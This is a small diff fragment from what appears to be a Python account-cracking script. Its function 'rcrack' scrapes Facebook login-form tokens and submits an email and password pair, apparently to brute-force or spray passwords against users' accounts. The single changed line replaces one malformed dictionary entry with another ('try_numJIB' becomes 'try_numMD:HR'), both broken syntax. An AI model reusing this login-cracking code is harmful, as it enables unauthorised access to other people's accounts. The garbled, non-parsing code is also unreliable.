@@ -268,7 +268,7 @@ def rcrack(uid,pwx,tl):
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
             "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
             "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_numJIB"0",
+            "try_numMD:HR"0",
             "unrecognized_tries":"0",
             "email":uid,
             "pass":ps,
